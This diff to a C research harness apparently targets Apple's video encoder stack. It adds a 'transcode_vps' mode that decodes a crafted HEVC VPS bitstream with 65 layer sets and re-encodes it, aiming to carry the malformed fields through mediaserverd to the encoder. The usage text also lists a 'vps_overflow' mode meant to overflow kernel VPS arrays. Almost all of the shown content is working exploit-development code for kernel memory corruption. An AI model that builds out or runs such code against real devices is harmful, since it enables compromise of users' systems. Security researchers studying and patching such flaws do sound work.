@@ -107,6 +107,19 @@ static void encode_cb(void *ctx, void *src, OSStatus status,
     }
 }
 
+static volatile CVPixelBufferRef g_decoded_pb = NULL;
+static volatile int g_decode_got_frame = 0;
+
+static void decode_cb(void *refcon, void *src,
+                      OSStatus status, VTDecodeInfoFlags flags,
+                      CVImageBufferRef buf, CMTime pts, CMTime dur) {
+    (void)refcon; (void)src; (void)flags; (void)pts; (void)dur;
+    if (status == 0 && buf) {
+        g_decoded_pb = (CVPixelBufferRef)CFRetain(buf);
+        g_decode_got_frame = 1;
+    }
+}
+
 static void dump_psets(CMFormatDescriptionRef fmt, size_t baseline) {
     if (!fmt) { rlog("No format description available\n"); return; }
     size_t count = 0;
@@ -4587,6 +4600,175 @@ cleanup_dummies:
 
         rlog("Found %d AVE/video-related services\n", found_count);
 
+    } else if (strcmp(mode, "transcode_vps") == 0) {
+        /*
+         * transcode_vps — Decode crafted VPS bitstream then re-encode.
+         * If mediaserverd preserves format description metadata during
+         * the decode→encode pipeline, the crafted VPS fields may reach
+         * the encoder's sAddClient through the re-encode path.
+         */
+        rlog("=== Transcode VPS Injection Test ===\n\n");
+
+        /* Build crafted parameter sets */
+        uint8_t vps_nal[8192];
+        size_t vps_len = build_crafted_vps(vps_nal, sizeof(vps_nal), 65);
+        uint8_t sps_nal[256];
+        size_t sps_len = build_minimal_sps(sps_nal, sizeof(sps_nal));
+        uint8_t pps_nal[128];
+        size_t pps_len = build_minimal_pps(pps_nal, sizeof(pps_nal));
+
+        const uint8_t *psets[] = { vps_nal, sps_nal, pps_nal };
+        size_t psizes[] = { vps_len, sps_len, pps_len };
+
+        CMFormatDescriptionRef crafted_fmt = NULL;
+        OSStatus st = CMVideoFormatDescriptionCreateFromHEVCParameterSets(
+            NULL, 3, psets, psizes, 4, NULL, &crafted_fmt);
+        rlog("Crafted format (65 layer sets): %d\n", (int)st);
+        if (st != 0 || !crafted_fmt) goto done;
+
+        /* Log format extensions */
+        CFDictionaryRef exts = CMFormatDescriptionGetExtensions(crafted_fmt);
+        if (exts) {
+            CFIndex cnt = CFDictionaryGetCount(exts);
+            rlog("Format has %ld extension keys\n", (long)cnt);
+        }
+
+        /* Create decoder with crafted format */
+        rlog("Creating decoder with crafted format...\n");
+        VTDecompressionSessionRef decomp = NULL;
+        g_decoded_pb = NULL;
+        g_decode_got_frame = 0;
+
+        VTDecompressionOutputCallbackRecord dec_cb;
+        dec_cb.decompressionOutputRefCon = NULL;
+        dec_cb.decompressionOutputCallback = decode_cb;
+
+        /* Destination pixel buffer attributes */
+        CFMutableDictionaryRef dest = CFDictionaryCreateMutable(NULL, 1,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int pf = kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange;
+        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFDictionarySetValue(dest, kCVPixelBufferPixelFormatTypeKey, pfn);
+        CFRelease(pfn);
+
+        st = VTDecompressionSessionCreate(NULL, crafted_fmt,
+            NULL, dest, &dec_cb, &decomp);
+        CFRelease(dest);
+        rlog("Decoder create: %d\n", (int)st);
+
+        if (st != 0 || !decomp) {
+            rlog("Failed to create decoder\n");
+            CFRelease(crafted_fmt);
+            goto done;
+        }
+
+        /* Create a fake IDR frame to decode */
+        uint8_t fake_slice[16] = {
+            0x00, 0x00, 0x00, 0x08,
+            0x26, 0x01, 0xAF, 0x09, 0x40, 0x00, 0x00, 0x00
+        };
+
+        CMBlockBufferRef block = NULL;
+        st = CMBlockBufferCreateWithMemoryBlock(NULL,
+            fake_slice, sizeof(fake_slice), NULL, NULL,
+            0, sizeof(fake_slice), 0, &block);
+
+        if (st == 0 && block) {
+            CMSampleBufferRef sample = NULL;
+            CMSampleTimingInfo timing = {
+                .duration = CMTimeMake(1, 30),
+                .presentationTimeStamp = CMTimeMake(0, 30),
+                .decodeTimeStamp = kCMTimeInvalid
+            };
+            size_t ssize = sizeof(fake_slice);
+            st = CMSampleBufferCreate(NULL, block, true, NULL, NULL,
+                crafted_fmt, 1, 1, &timing, 1, &ssize, &sample);
+
+            if (st == 0 && sample) {
+                VTDecodeFrameFlags flags = kVTDecodeFrame_EnableAsynchronousDecompression;
+                VTDecodeInfoFlags info = 0;
+                st = VTDecompressionSessionDecodeFrame(decomp,
+                    sample, flags, NULL, &info);
+                rlog("DecodeFrame: %d (info=0x%x)\n", (int)st, (unsigned)info);
+
+                VTDecompressionSessionWaitForAsynchronousFrames(decomp);
+                rlog("Got decoded frame: %d\n", g_decode_got_frame);
+
+                if (g_decoded_pb) {
+                    rlog("Decoded pixel buffer: %lux%lu\n",
+                        CVPixelBufferGetWidth(g_decoded_pb),
+                        CVPixelBufferGetHeight(g_decoded_pb));
+
+                    /* Check if the decoded buffer carries format metadata */
+                    CFDictionaryRef attachments = CVBufferCopyAttachments(
+                        g_decoded_pb, kCVAttachmentMode_ShouldPropagate);
+                    if (attachments) {
+                        CFIndex kcnt = CFDictionaryGetCount(attachments);
+                        rlog("Decoded buffer has %ld propagating attachments\n",
+                            (long)kcnt);
+                        CFRelease(attachments);
+                    }
+
+                    /* Now re-encode this buffer through HEVC encoder */
+                    rlog("\n--- Re-encoding decoded buffer ---\n");
+                    VTCompressionSessionRef enc = NULL;
+                    st = VTCompressionSessionCreate(NULL, 128, 128,
+                        kCMVideoCodecType_HEVC, NULL, NULL, NULL,
+                        encode_cb, NULL, &enc);
+                    rlog("Encoder create: %d\n", (int)st);
+
+                    if (st == 0 && enc) {
+                        st = VTCompressionSessionPrepareToEncodeFrames(enc);
+                        g_encode_done = 0;
+                        g_cb_count = 0;
+
+                        CMTime pts2 = CMTimeMake(0, 30);
+                        const void *fk[] = { kVTEncodeFrameOptionKey_ForceKeyFrame };
+                        const void *fv[] = { kCFBooleanTrue };
+                        CFDictionaryRef fp = CFDictionaryCreate(NULL, fk, fv, 1,
+                            &kCFTypeDictionaryKeyCallBacks,
+                            &kCFTypeDictionaryValueCallBacks);
+
+                        st = VTCompressionSessionEncodeFrame(enc, (CVPixelBufferRef)g_decoded_pb,
+                            pts2, kCMTimeInvalid, fp, NULL, NULL);
+                        rlog("Re-encode: %d\n", (int)st);
+                        CFRelease(fp);
+
+                        for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
+                        VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);
+
+                        rlog("Callback count: %d, status: %d\n",
+                            g_cb_count, (int)g_cb_status);
+
+                        if (g_saved_fmt) {
+                            rlog("Re-encoded output parameter sets:\n");
+                            dump_psets(g_saved_fmt, 0);
+
+                            const uint8_t *out_vps = NULL;
+                            size_t out_vps_sz = 0;
+                            CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                                g_saved_fmt, 0, &out_vps, &out_vps_sz, NULL, NULL);
+                            rlog("Re-encoded VPS: %zu bytes (crafted=%zu)\n",
+                                out_vps_sz, vps_len);
+                            CFRelease(g_saved_fmt);
+                            g_saved_fmt = NULL;
+                        }
+
+                        VTCompressionSessionInvalidate(enc);
+                        CFRelease(enc);
+                    }
+                    CVPixelBufferRelease((CVPixelBufferRef)g_decoded_pb);
+                    g_decoded_pb = NULL;
+                }
+                CFRelease(sample);
+            }
+            CFRelease(block);
+        }
+
+        VTDecompressionSessionInvalidate(decomp);
+        CFRelease(decomp);
+        CFRelease(crafted_fmt);
+
     } else if (strcmp(mode, "vps_verify") == 0) {
         /*
          * vps_verify — Verify whether crafted VPS reaches the kernel
@@ -5164,7 +5346,8 @@ cleanup_dummies:
         rlog("  vps_overflow       -- KEY: Set >64 MV-HEVC layers to overflow kernel VPS arrays\n");
         rlog("  iokit_vps [phase]  -- Direct IOKit probe: enumerate AVE service + craft VPS\n");
         rlog("  iokit_enum         -- Enumerate all IOKit video encoder services\n");
-        rlog("  vps_verify         -- KEY: Verify if crafted VPS reaches kernel (compare output)\n");
+        rlog("  transcode_vps      -- KEY: Decode crafted VPS then re-encode (transcode path)\n");
+        rlog("  vps_verify         -- Verify if crafted VPS reaches kernel (compare output)\n");
         rlog("  xpc_vps [phase]    -- XPC VPS field manipulation + crafted format injection\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
